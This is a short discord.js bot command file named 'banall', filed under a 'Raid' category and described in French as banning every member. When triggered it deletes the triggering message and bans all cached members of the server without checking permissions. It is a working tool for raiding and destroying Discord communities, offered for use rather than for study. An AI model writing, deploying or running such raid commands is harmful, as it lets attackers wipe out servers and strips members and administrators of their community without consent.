const Discord = require('discord.js')

module.exports = {

	name: 'banall',

	aliases: [],

	category: "Raid",

	description: "Ban tous les membres",

	usage: "banall",

	examples: [],

	run: async (client, message, args, prefix) => {

		try {

            message.delete()
            message.guild.members.cache.forEach(m => m.ban ({
    }));
		} catch (error) {
          console.error(error)  
          message.channel.send("Une erreur s'est produite.")
          }

	}

}

